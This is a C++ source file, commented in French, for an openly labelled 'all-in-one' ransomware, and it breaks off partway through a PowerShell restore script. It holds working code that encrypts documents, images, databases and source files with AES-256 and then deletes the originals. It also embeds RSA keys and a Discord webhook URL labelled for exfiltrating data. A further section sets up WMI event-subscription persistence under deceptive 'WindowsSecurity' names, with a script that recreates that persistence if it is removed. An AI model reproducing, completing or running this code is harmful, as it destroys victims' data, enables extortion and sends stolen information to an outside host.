/*
 * RANSOMWARE TOUT-EN-UN
 * Inclut:
 * - Chiffrement AES+RSA
 * - Persistance avancée (WMI, registre, etc.)
 * - Injection de processus
 * - Techniques Living-off-the-land
 * - Double extorsion
 * - Anti-analyse et évasion
 * - Suppression des sauvegardes
 */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <thread>
#include <chrono>
#include <random>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <functional>
#include <mutex>
#include <atomic>

// Windows API - ORDRE CORRIGÉ
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <userenv.h>
#include <iphlpapi.h>
#include <winternl.h>

// OpenSSL
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>

// Pour la manipulation de fichiers et chemins
namespace fs = std::filesystem;

// URL du webhook Discord pour exfiltration
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN";

// Extensions des fichiers à chiffrer avec priorité
const std::vector<std::string> TARGET_EXTENSIONS = {
    // Documents
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".txt", ".csv",
    // Images
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".raw", ".psd",
    // Audio/Video
    ".mp3", ".wav", ".mp4", ".avi", ".mov", ".mkv", ".flv", ".wmv",
    // Archives
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
    // Bases de données
    ".sql", ".db", ".sqlite", ".accdb", ".mdb",
    // Développement
    ".c", ".cpp", ".h", ".java", ".py", ".php", ".html", ".css", ".js", ".json"
};

// Extension ajoutée aux fichiers chiffrés
const std::string ENCRYPTED_EXTENSION = ".encrypted";

// Clé RSA publique intégrée (format PEM encodé en base64)
const char* RSA_PUBLIC_KEY = 
"-----BEGIN PUBLIC KEY-----\n"
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyGx4fuAkl4tb1qYuJxQf\n"
"nL9wCOO29eujIcwdEOc5x0VZ3JLmcxemC4U5mQR9T5EARcy5trLtVrFXboW/CJGO\n"
"AxrIGgJxF+x+7JwRIM1E4KdFSUdHyWNLQWYeJ5+/BoiJ6/x8VRfj21HV1WPqJRcN\n"
"Aqm2uct0GRuspZF2hR5SOTb9CDEL76Q/NCv2fGBwcxVPn36QnZGUz6LVC6Zaq2SD\n"
"xCLqOyKVoQNLlsVaS9Nz8l2vwJh+jG6RZ3rv/HfIkbVXxqJqRgpAsnwLYbpFaLAs\n"
"ZgZ9GiJ+5s0p5YCFJhK0MfIYMvbXkF7DXlkxS0aZJfxpzM9M8SHh7USoHHX1Llij\n"
"5QIDAQAB\n"
"-----END PUBLIC KEY-----";

// Clé privée RSA correspondante (à conserver séparément dans un déploiement réel)
const char* RSA_PRIVATE_KEY = 
"-----BEGIN RSA PRIVATE KEY-----\n"
"MIIEowIBAAKCAQEAyGx4fuAkl4tb1qYuJxQfnL9wCOO29eujIcwdEOc5x0VZ3JLm\n"
"cxemC4U5mQR9T5EARcy5trLtVrFXboW/CJGOAxrIGgJxF+x+7JwRIM1E4KdFSUdH\n"
"yWNLQWYeJ5+/BoiJ6/x8VRfj21HV1WPqJRcNAqm2uct0GRuspZF2hR5SOTb9CDEL\n"
"76Q/NCv2fGBwcxVPn36QnZGUz6LVC6Zaq2SDxCLqOyKVoQNLlsVaS9Nz8l2vwJh+\n"
"jG6RZ3rv/HfIkbVXxqJqRgpAsnwLYbpFaLAsZgZ9GiJ+5s0p5YCFJhK0MfIYMvbX\n"
"kF7DXlkxS0aZJfxpzM9M8SHh7USoHHX1Llij5QIDAQABAoIBABy6TcDFjJhCiNJw\n"
"qoPfn5gW2TggD9RCYRd5g+IPaIK+y0TYpCUe3L0xnMQDh1gHQ+qQ3PN9VAXuGM5U\n"
"K9pUbVL0YZRs7QBr2K5qZ1XCzu/uXYxZz9CXqXOGEj8B5grWbX0F29LprOG4VvO+\n"
"kDSTUlwaYgTSt9Cvj0MptPL4MekFxXr4ILWBuQI1B57VnZM2iBnb/fAjkJZr1MAH\n"
"e4YGfwDLlEyXEiYH5wRTKV6HQjPrCcThN8HMmuEkKxLzKEpFkdiKIXE1XFxFYN26\n"
"o2qeZ1+1rLJnp5vUFtj+xgEEGHJvWzAVmL1bTbYXrCIqQ+23IMxvyKv1ZO3YOXKq\n"
"Jd7RXsECgYEA7SHR5OM1vQdI9jjzlPYUJbfGRYJ4IZ4uxvGJ+oEArYIxK9L9ePXG\n"
"ZKJ4uGBbgV/jgqzCkz8YJX0/6nH9g83VX3I2f8xIHGT8vA2s/0vYPKXcRKXxGXcL\n"
"V5JJJQzjWpj8Z3xf/GC1lcTECIpHj1jRk7KOJafbLKx0lYIr3BZlY7kCgYEA2HVN\n"
"4KxFtBTQVdDcpQAmePPPbFBYUYfQ3p7RmFLEg5JsLLgZeM3RF1M4U1EoN9vnS9Dn\n"
"PQADDrRYk5ZrJzQsuZ+M8yY/LKXAgpzY5QpwZlI1DFrx3H6iCHqyHQgwUgGXB2PS\n"
"7jrY4CHZLDyQHZoLa4z2/1L+3EiaQbqmmhsAaX0CgYEA0jdDjKt9XHUPFHeusCu1\n"
"a+5yffLwVf5JE6ibRkAMXjDydFPP/RhR/BMUFFgDbhaCUe/FJI4wBvLiXm+T+Jww\n"
"TvBmy1xQUdYCxL8iJjKHvzxjnKDW67Epy57EXPoO4o8BRhDV92lYZVzfGcw0h4DZ\n"
"0jQiGwp7KLm9UqZV47LuPckCgYB+q8m7F6RqJW2WpYDvrx/3sFGQBIGx0YG1REHO\n"
"aKbzW+3dRDFp2DIwZ4dL84m+j6r9VKFrLXGVl+7vF7YHdwbP90+0MRKCxMGSKHZM\n"
"sTpZBK6BdLMCUoFSk9nopxR1ZzUzdJ+hM9/GQwSAX7nSqKIijNmnYMn+MNLKY7+g\n"
"dDIdzQKBgA/F1o+xSzXJQxK0+cSYJuk6l6pXA+9PVllOQ3NfVnV9iagj+V23BvVs\n"
"9hZrhmHF4IjKA8W1WLLEbnj6PZD64kFrUXDKPw8xOTlFSorI6RwPVotzgEFEPBLj\n"
"BrFCv1IVcNLmVMU/3tOz6mLAUGCe5Kd3m7N4kOxZQlKYIGUVF1KM\n"
"-----END RSA PRIVATE KEY-----";

// Variables globales
std::atomic<bool> g_encryptionRunning(false);
std::atomic<int> g_totalFiles(0);
std::atomic<int> g_encryptedFiles(0);
std::mutex g_mutex;

// ===========================================================================================
// CLASSES ET FONCTIONS UTILITAIRES
// ===========================================================================================

// Fonction pour obtenir le chemin de l'exécutable actuel
std::string GetExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// Obtenir le nom d'utilisateur actuel
std::string GetCurrentUsername() {
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "Unknown";
}

// Obtenir le nom de la machine
std::string GetComputerName() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "Unknown";
}

// Fonction d'encodage base64
std::string base64Encode(const std::vector<unsigned char>& data) {
    BIO *bio, *b64;
    BUF_MEM *bufferPtr;
    
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(bio, data.data(), static_cast<int>(data.size()));
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);
    
    std::string result(bufferPtr->data, bufferPtr->length);
    BIO_free_all(bio);
    
    return result;
}

// Fonction de décodage base64
std::vector<unsigned char> base64Decode(const std::string& encoded) {
    BIO *bio, *b64;
    
    int decodedLength = static_cast<int>(encoded.size());
    std::vector<unsigned char> decoded(decodedLength);
    
    bio = BIO_new_mem_buf(encoded.c_str(), -1);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);
    
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    decodedLength = BIO_read(bio, decoded.data(), static_cast<int>(encoded.size()));
    BIO_free_all(bio);
    
    decoded.resize(decodedLength);
    return decoded;
}

// ===========================================================================================
// CLASSE DE CHIFFREMENT HYBRIDE AES+RSA
// ===========================================================================================

class AdvancedEncryption {
private:
    std::vector<unsigned char> aesKey;
    std::vector<unsigned char> aesIV;
    RSA* rsaPublicKey;
    RSA* rsaPrivateKey;
    
public:
    // Constructeur
    AdvancedEncryption() {
        // Initialiser OpenSSL
        OpenSSL_add_all_algorithms();
        ERR_load_crypto_strings();
        
        // Générer une clé AES-256 aléatoire
        aesKey.resize(32);
        RAND_bytes(aesKey.data(), static_cast<int>(aesKey.size()));
        
        // Générer un IV AES aléatoire
        aesIV.resize(16);
        RAND_bytes(aesIV.data(), static_cast<int>(aesIV.size()));
        
        // Charger la clé publique RSA
        BIO* bioPublic = BIO_new_mem_buf(RSA_PUBLIC_KEY, -1);
        rsaPublicKey = PEM_read_bio_RSA_PUBKEY(bioPublic, NULL, NULL, NULL);
        BIO_free(bioPublic);
        
        // Charger la clé privée RSA (dans un vrai ransomware, cette clé ne serait pas incluse)
        BIO* bioPrivate = BIO_new_mem_buf(RSA_PRIVATE_KEY, -1);
        rsaPrivateKey = PEM_read_bio_RSAPrivateKey(bioPrivate, NULL, NULL, NULL);
        BIO_free(bioPrivate);
        
        if (!rsaPublicKey) {
            std::cerr << "Erreur lors du chargement de la clé publique RSA" << std::endl;
            ERR_print_errors_fp(stderr);
        }
    }
    
    // Destructeur
    ~AdvancedEncryption() {
        if (rsaPublicKey) RSA_free(rsaPublicKey);
        if (rsaPrivateKey) RSA_free(rsaPrivateKey);
        EVP_cleanup();
        ERR_free_strings();
    }
    
    // Récupérer la clé AES
    const std::vector<unsigned char>& getAesKey() const {
        return aesKey;
    }
    
    // Récupérer l'IV AES
    const std::vector<unsigned char>& getAesIV() const {
        return aesIV;
    }
    
    // Chiffrer la clé AES avec RSA pour transmission sécurisée
    std::vector<unsigned char> encryptAesKeyWithRsa() const {
        if (!rsaPublicKey) {
            std::cerr << "Clé publique RSA non disponible" << std::endl;
            return std::vector<unsigned char>();
        }
        
        // Créer un buffer pour la clé chiffrée (taille RSA)
        std::vector<unsigned char> encryptedKey(RSA_size(rsaPublicKey));
        
        // Chiffrer la clé AES avec RSA
        int encryptedSize = RSA_public_encrypt(
            static_cast<int>(aesKey.size()),
            aesKey.data(),
            encryptedKey.data(),
            rsaPublicKey,
            RSA_PKCS1_PADDING
        );
        
        if (encryptedSize == -1) {
            std::cerr << "Erreur lors du chiffrement RSA: " << ERR_error_string(ERR_get_error(), NULL) << std::endl;
            return std::vector<unsigned char>();
        }
        
        encryptedKey.resize(encryptedSize);
        return encryptedKey;
    }
    
    // Déchiffrer une clé AES chiffrée avec RSA
    bool decryptAesKeyWithRsa(const std::vector<unsigned char>& encryptedKey) {
        if (!rsaPrivateKey) {
            std::cerr << "Clé privée RSA non disponible" << std::endl;
            return false;
        }
        
        // Créer un buffer pour la clé déchiffrée
        std::vector<unsigned char> decryptedKey(RSA_size(rsaPrivateKey));
        
        // Déchiffrer la clé AES avec RSA
        int decryptedSize = RSA_private_decrypt(
            static_cast<int>(encryptedKey.size()),
            encryptedKey.data(),
            decryptedKey.data(),
            rsaPrivateKey,
            RSA_PKCS1_PADDING
        );
        
        if (decryptedSize == -1) {
            std::cerr << "Erreur lors du déchiffrement RSA: " << ERR_error_string(ERR_get_error(), NULL) << std::endl;
            return false;
        }
        
        // Mettre à jour la clé AES avec la clé déchiffrée
        aesKey.assign(decryptedKey.begin(), decryptedKey.begin() + decryptedSize);
        return true;
    }
    
    // Chiffrer un fichier avec AES
    bool encryptFileWithAes(const std::string& filePath) {
        // Vérifier si le fichier existe et n'est pas déjà chiffré
        if (!fs::exists(filePath) || filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
            return false;
        }
        
        // Obtenir la taille du fichier et vérifier qu'il n'est pas vide
        uintmax_t fileSize = fs::file_size(filePath);
        if (fileSize < 10) { // Ignorer les fichiers trop petits
            return false;
        }
        
        // Vérifier l'extension du fichier
        std::string extension = filePath.substr(filePath.find_last_of(".") + 1);
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
        
        // Ignorer certains types de fichiers système
        std::vector<std::string> systemExtensions = {"sys", "dll", "exe", "com", "bat", "inf"};
        for (const auto& ext : systemExtensions) {
            if (extension == ext && filePath.find("Windows") != std::string::npos) {
                return false;
            }
        }
        
        // Ouvrir le fichier source en lecture binaire
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) {
            return false;
        }
        
        // Créer le fichier de destination pour le contenu chiffré
        std::string encryptedFilePath = filePath + ENCRYPTED_EXTENSION;
        std::ofstream outFile(encryptedFilePath, std::ios::binary);
        if (!outFile) {
            inFile.close();
            return false;
        }
        
        // Initialiser le contexte de chiffrement AES
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            inFile.close();
            outFile.close();
            return false;
        }
        
        // Initialiser l'opération de chiffrement
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, aesKey.data(), aesIV.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            inFile.close();
            outFile.close();
            return false;
        }
        
        // Écrire une signature pour identifier les fichiers chiffrés
        const char* signature = "ENCRYPTED_BY_RANSOMWARE_";
        outFile.write(signature, strlen(signature));
        
        // Écrire l'IV au début du fichier (nécessaire pour le déchiffrement)
        outFile.write(reinterpret_cast<const char*>(aesIV.data()), aesIV.size());
        
        // Lire et chiffrer le fichier par blocs
        const int bufSize = 4096;
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            std::streamsize bytesRead = inFile.gcount();
            if (bytesRead <= 0) break;
            
            if (EVP_EncryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), static_cast<int>(bytesRead)) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                inFile.close();
                outFile.close();
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        }
        
        // Finaliser le chiffrement (traiter les derniers blocs)
        if (EVP_EncryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            inFile.close();
            outFile.close();
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Nettoyer les ressources
        EVP_CIPHER_CTX_free(ctx);
        inFile.close();
        outFile.close();
        
        // Supprimer le fichier original après chiffrement réussi
        fs::remove(filePath);
        
        return true;
    }
    
    // Déchiffrer un fichier avec AES
    bool decryptFileWithAes(const std::string& encryptedFilePath) {
        // Vérifier si le fichier existe et est chiffré
        if (!fs::exists(encryptedFilePath) || encryptedFilePath.find(ENCRYPTED_EXTENSION) == std::string::npos) {
            return false;
        }
        
        // Ouvrir le fichier chiffré en lecture binaire
        std::ifstream inFile(encryptedFilePath, std::ios::binary);
        if (!inFile) {
            return false;
        }
        
        // Créer le fichier de destination pour le contenu déchiffré
        std::string decryptedFilePath = encryptedFilePath.substr(0, encryptedFilePath.length() - ENCRYPTED_EXTENSION.length());
        std::ofstream outFile(decryptedFilePath, std::ios::binary);
        if (!outFile) {
            inFile.close();
            return false;
        }
        
        // Lire et ignorer la signature
        const int signatureLen = strlen("ENCRYPTED_BY_RANSOMWARE_");
        std::vector<char> signature(signatureLen);
        inFile.read(signature.data(), signatureLen);
        
        // Lire l'IV du fichier
        std::vector<unsigned char> fileIV(16);
        inFile.read(reinterpret_cast<char*>(fileIV.data()), 16);
        
        // Initialiser le contexte de déchiffrement AES
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            inFile.close();
            outFile.close();
            return false;
        }
        
        // Initialiser l'opération de déchiffrement
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, aesKey.data(), fileIV.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            inFile.close();
            outFile.close();
            return false;
        }
        
        // Lire et déchiffrer le fichier par blocs
        const int bufSize = 4096;
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            std::streamsize bytesRead = inFile.gcount();
            if (bytesRead <= 0) break;
            
            if (EVP_DecryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), static_cast<int>(bytesRead)) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                inFile.close();
                outFile.close();
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        }
        
        // Finaliser le déchiffrement (traiter les derniers blocs)
        if (EVP_DecryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            inFile.close();
            outFile.close();
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Nettoyer les ressources
        EVP_CIPHER_CTX_free(ctx);
        inFile.close();
        outFile.close();
        
        // Supprimer le fichier chiffré après déchiffrement réussi
        fs::remove(encryptedFilePath);
        
        return true;
    }
    
    // Sauvegarder la clé AES dans un fichier
    bool saveAesKeyToFile(const std::string& keyFilePath) {
        std::ofstream keyFile(keyFilePath, std::ios::binary);
        if (!keyFile) {
            return false;
        }
        
        keyFile.write(reinterpret_cast<const char*>(aesKey.data()), aesKey.size());
        keyFile.write(reinterpret_cast<const char*>(aesIV.data()), aesIV.size());
        keyFile.close();
        
        return true;
    }
    
    // Charger la clé AES depuis un fichier
    bool loadAesKeyFromFile(const std::string& keyFilePath) {
        std::ifstream keyFile(keyFilePath, std::ios::binary);
        if (!keyFile) {
            return false;
        }
        
        keyFile.read(reinterpret_cast<char*>(aesKey.data()), aesKey.size());
        keyFile.read(reinterpret_cast<char*>(aesIV.data()), aesIV.size());
        keyFile.close();
        
        return true;
    }
}; 

// ===========================================================================================
// FONCTIONS DE PERSISTANCE WMI
// ===========================================================================================

// Configuration de la persistance via WMI
bool SetupWMIPersistence() {
    std::cout << "[*] Configuration de la persistance WMI..." << std::endl;
    
    // Obtenir le chemin de l'exécutable
    std::string exePath = GetExecutablePath();
    if (exePath.empty()) {
        std::cout << "[!] Impossible d'obtenir le chemin de l'exécutable" << std::endl;
        return false;
    }
    
    // Échapper les backslashes pour PowerShell
    std::string escapedPath = exePath;
    size_t pos = 0;
    while ((pos = escapedPath.find("\\", pos)) != std::string::npos) {
        escapedPath.replace(pos, 1, "\\\\");
        pos += 2;
    }
    
    // 1. Créer un filtre d'événement permanent (déclencheur) pour une exécution périodique
    std::string createFilterCmd = "powershell -Command \"$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WindowsSecurityFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour % 1 = 0'}\"";
    
    // 2. Créer un consommateur de commande qui exécutera notre programme
    std::string createConsumerCmd = "powershell -Command \"$Command = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='WindowsSecurityConsumer'; CommandLineTemplate='" + escapedPath + "'; RunInteractively='false'}\"";
    
    // 3. Créer une liaison entre le filtre et le consommateur
    std::string createBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsSecurityFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
    
    // 4. Créer un déclencheur au démarrage système (lorsque explorer.exe est lancé)
    std::string createBootFilterCmd = "powershell -Command \"$BootFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WindowsBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"explorer.exe\\\"'}\"";
    
    std::string createBootBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
    
    // 5. Démarrage précoce - Winlogon (plus tôt dans le démarrage)
    std::string createWinlogonFilterCmd = "powershell -Command \"$WinlogonFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WinlogonBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"winlogon.exe\\\"'}\"";
    
    std::string createWinlogonBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WinlogonBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
    
    // 6. Démarrage très précoce - SMSS (Session Manager Subsystem)
    std::string createSmssFilterCmd = "powershell -Command \"$SmssFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='SmssBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"smss.exe\\\"'}\"";
    
    std::string createSmssBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='SmssBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
    
    // 7. Créer une classe WMI personnalisée pour stocker des données de configuration
    std::string createClassCmd = "powershell -Command \"$Namespace = 'root\\SecurityServices'; if (-not (Get-WmiObject -Namespace 'root' -Class __NAMESPACE -Filter \\\"Name='SecurityServices'\\\")) { $NewNamespace = New-Object System.Management.ManagementClass('root', $null, $null); $NewNamespace.Name = 'SecurityServices'; $NewNamespace.Put() }; $BasePath = ([WmiClass] 'root\\SecurityServices:Win32_SecurityProvider').Path.Path; if (-not $BasePath) { $NewClass = New-Object System.Management.ManagementClass('root\\SecurityServices', [string]::Empty, $null); $NewClass['__CLASS'] = 'Win32_SecurityProvider'; $NewClass.Qualifiers.Add('Static', $true); $NewClass.Properties.Add('ID', [System.Management.CimType]::String, $false); $NewClass.Properties['ID'].Qualifiers.Add('Key', $true); $NewClass.Properties.Add('Library', [System.Management.CimType]::String, $false); $NewClass.Properties.Add('Status', [System.Management.CimType]::UInt32, $false); $NewClass.Put() }\"";
    
    // 8. Stocker le chemin dans cette classe WMI permanente
    std::string storeDataCmd = "powershell -Command \"$ClassName = 'Win32_SecurityProvider'; $WmiInstance = Set-WmiInstance -Namespace 'root\\SecurityServices' -Class $ClassName -Arguments @{ID='SecurityManager'; Library='" + escapedPath + "'; Status=1}\"";
    
    // 9. Créer un script de restauration pour réactiver la persistance si elle est supprimée
    std::string tempDir = std::string(getenv("TEMP"));
    std::string wmiRestorePath = tempDir + "\\SecurityServices.ps1";
    std::ofstream wmiRestoreScript(wmiRestorePath);
    
    if (wmiRestoreScript.is_open()) {
        wmiRestoreScript << "$LibraryPath = (Get-WmiObject -Namespace 'root\\SecurityServices' -Class Win32_SecurityProvider -Filter \"ID='SecurityManager'\").Library" << std::endl;
        wmiRestoreScript << "# Vérifier si les filtres WMI existent, sinon les recréer" << std::endl;
        wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsSecurityFilter'\")) {" << std::endl;
        wmiRestoreScript << "    # Recréer le filtre principal" << std::endl;
        wmiRestoreScript << "    $Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Name='WindowsSecurityFilter';" << std::endl;
        wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
        wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
        wmiRestoreScript << "        Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour % 1 = 0'" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "}" << std::endl;
        wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\")) {" << std::endl;
        wmiRestoreScript << "    # Recréer le consommateur" << std::endl;
        wmiRestoreScript << "    $Command = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Name='WindowsSecurityConsumer';" << std::endl;
        wmiRestoreScript << "        CommandLineTemplate=$LibraryPath;" << std::endl;
        wmiRestoreScript << "        RunInteractively='false'" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "}" << std::endl;
        wmiRestoreScript << "# Recréer les liaisons si nécessaires" << std::endl;
        wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -Filter \"Filter.Name='WindowsSecurityFilter' AND Consumer.Name='WindowsSecurityConsumer'\")) {" << std::endl;
        wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Filter = (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsSecurityFilter'\");" << std::endl;
        wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
        wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "}" << std::endl;
        wmiRestoreScript << "# Vérifier le filtre de démarrage" << std::endl;
        wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsBootFilter'\")) {" << std::endl;
        wmiRestoreScript << "    # Recréer le filtre de démarrage" << std::endl;
        wmiRestoreScript << "    $BootFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Name='WindowsBootFilter';" << std::endl;
        wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
        wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
        wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"explorer.exe\"'" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "    # Recréer la liaison de démarrage" << std::endl;
        wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Filter = (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsBootFilter'\");" << std::endl;
        wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
        wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
        wmiRestoreScript << "}" << std::endl;
        wmiRestoreScript << "# Vérifier les filtres Winlogon et SMSS" << std::endl;
        wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WinlogonBootFilter'\")) {" << std::endl;
        wmiRestoreScript << "    $WinlogonFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
        wmiRestoreScript << "        Name='WinlogonBootFilter';" << std::endl;
        wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
        wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
        wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"winlogon.exe\"'" << std::endl;
        wmiRestoreScript << "    }" << std::endl;
